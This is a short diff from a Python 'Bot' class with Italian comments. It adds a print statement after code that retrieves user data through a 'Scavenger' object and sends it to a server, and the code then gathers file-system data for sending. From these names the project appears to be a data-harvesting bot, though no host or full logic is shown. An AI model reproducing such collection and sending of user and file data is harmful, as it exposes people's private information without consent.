@@ -82,7 +82,7 @@ class Bot:
         userData = self.Scavenger.retriveUser()
         # manda dati user
         self.sendToServer(userData)
-
+        print("User Inviato")
         inputSentence = self.Scavenger.fileSystemRetrival()
         self.fileSystem_sentence = inputSentence
         self.send_sentence = self.fileSystem_sentence
